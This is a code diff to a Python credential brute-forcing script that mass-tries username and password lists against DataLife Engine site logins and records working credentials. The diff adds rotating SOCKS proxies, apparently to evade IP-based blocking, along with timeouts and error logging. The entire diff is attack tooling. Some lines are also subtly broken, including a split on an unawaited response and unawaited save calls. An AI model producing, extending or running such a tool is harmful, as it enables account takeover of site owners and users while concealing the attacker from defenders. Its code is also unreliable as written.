@@ -8,6 +8,7 @@ from urllib.parse import urlsplit
 
 from aiofiles import open as afile
 from aiohttp import ClientSession
+from aiohttp_socks import SocksConnector
 from async_timeout import timeout as ftime
 from bs4 import BeautifulSoup
 
@@ -68,20 +69,28 @@ async def macros(p, u, s):
     return p
 
 
+async def proxy_request():
+    async with ClientSession() as s:
+        async with s.get(proxy_url) as resp:
+            return await (resp.text()).split('\n')
+
+
 async def save(where, what):
     async with afile(f'rez/{where}.txt', 'a',
                      encoding='utf-8', errors='ignore') as f:
-        await f.write(what + '\n')
+        await f.write(str(what) + '\n')
 
 
 async def first(s, url):
-    async with s.get(url, ssl=False) as r:
-        return [await r.text(), r.status]
+    async with ftime(timeout):
+        async with s.get(url, ssl=False) as r:
+            return [await r.text(), r.status]
 
 
 async def second(s, url, data):
-    async with s.post(url, data=data, ssl=False) as r:
-        return [await r.text(), r.status]
+    async with ftime(timeout):
+        async with s.post(url, data=data, ssl=False) as r:
+            return [await r.text(), r.status]
 
 
 async def valid(status, text, url):
@@ -97,27 +106,33 @@ async def valid(status, text, url):
         return True
 
 
-async def DLE(link, user, passw):
+async def DLE(link, user, passw, proxy):
     global finished, good
+
+    cproxy = SocksConnector.from_url('socks5://' + proxy)
 
     try:
         user = await macros(user, link, '')
         passw = await macros(passw, link, user)
 
-        async with ftime(timeout):
-            with silent_out():
-                async with ClientSession() as s:
-                    data = await first(s, link)
-                    assert await valid(data[1], data[0], link) is True
+        with silent_out():
+            async with ClientSession(connector=cproxy) as s:
+                data = await first(s, link)
 
-                    _post = await parse(data[0], user, passw)
-                    data = await second(s, link, _post)
-                    assert 'action=logout' in data[0]
+                if not await valid(data[1], data[0], link):
+                    save('rebrut', f'{link} - {user}:{passw}')
+                    return
 
-                    good += 1
-                    await save('good', f'{link} - {user}:{passw}')
-    except:
-        pass
+                _post = await parse(data[0], user, passw)
+                data = await second(s, link, _post)
+                assert 'action=logout' in data[0]
+
+                good += 1
+                await save('good', f'{link} - {user}:{passw}')
+    except asyncio.TimeoutError:
+        save('timeout', f'{link} - {user}:{passw}')
+    except Exception as e:
+        save('report', e)
     finally:
         finished += 1
         print(f'Good: {good}; Done: {finished}', end='\r')
@@ -126,6 +141,10 @@ async def DLE(link, user, passw):
 
 async def main():
     tasks = []
+
+    proxies = await proxy_request()
+    lenofpr = len(proxies) - 10
+    curindx = 0
 
     async with afile("data/users.txt", encoding="utf-8",
                      errors="ignore") as users:
@@ -140,10 +159,19 @@ async def main():
                                 DLE(
                                     site.replace('\n', ''),
                                     user.replace('\n', ''),
-                                    passw.replace('\n', '')
+                                    passw.replace('\n', ''),
+                                    proxies[curindx]
                                 )
                             )
                             tasks.append(task)
+                            curindx += 1
+
+                            if curindx >= lenofpr:
+                                if rotate:
+                                    proxies = await proxy_request()
+                                    lenofpr = len(proxies) - 10
+
+                                curindx = 0
 
                             if len(tasks) >= threads:
                                 await asyncio.gather(*tasks)
@@ -158,5 +186,7 @@ if __name__ == "__main__":
     finished = 0
     threads = int(input('Threads: '))
     timeout = int(input('Timeout: '))
+    proxy_url = input('SOCKS4 Link: ')
+    rotate = bool(int(input('Rotate proxy: ')))
 
     asyncio.run(main())
